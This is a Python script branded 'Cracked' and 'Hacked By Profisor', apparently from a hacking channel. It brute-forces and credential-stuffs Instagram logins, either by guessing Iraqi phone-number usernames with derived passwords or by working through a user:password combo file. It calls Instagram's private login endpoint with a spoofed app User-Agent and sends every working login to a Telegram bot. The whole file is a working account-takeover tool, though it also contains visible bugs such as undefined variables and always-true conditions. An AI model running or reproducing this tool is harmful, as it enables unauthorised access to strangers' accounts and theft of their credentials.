#Cracked
import os , sys
from time import sleep
import random
import requests
from uuid import uuid4


def close():
    input('')
    sys.exit()
l = '\033[91m'
h = 0
b = 0
s = 0
block = 0

logo = l+"""
\033[96;1m
                                              
III N   N  SSS  TTTTTT  AA  
 I  NN  N S       TT   A  A 
 I  N N N  SSS    TT   AAAA 
 I  N  NN     S   TT   A  A 
III N   N SSSS    TT   A  A 
                            
Hacked By Profisor                             
                                             
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[36;1mCODE BY: IM PROFISOR
\033[34;1mCHANNEL: @rekarhack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
tele = input("\033[33;1mSTART AKAIT Y/N: ")
os.system('clear')
if "Y" in tele:
    id = input("\033[33;1mID TELEGRAM: ")
    bot = input("\033[33;1mTOKEN BOT: ")
elif "y" in tele:
    id = input("ID TELEGRAM: ")
    bot = input("TOKEN BOT: ")
    
print(logo)
xoshnaw = input("""| 1 | = NUMBER CHECKER
| 2 | = COMBO CHECKER
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n
HALLBZHERA DLM: """)
if xoshnaw == "1":
   
    nmuna = '0123456789'
    os.system('clear')
    print(logo)
    print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')

    while True:
        fuck = str(''.join((random.choice(nmuna) for i in range(8))))
        user = '+96477' + fuck
        pasw = '077' + fuck
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
            h += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'GOOD session' in log.text:
            b += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        else:
            b+=1    
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')

elif xoshnaw =="2":
    os.system('clear')
    print(logo)
    co = input("\033[1;91mCOMBO: ")
    if '.txt' in co:
        pass
    else:
        co  = co + '.txt'
   
    os.system('clear')
    print(logo)
    print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
    acc = open(co,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = session.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
         
            h += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'GOOD session' in log.text:
            b += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        else:
            b+=1    
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')

    

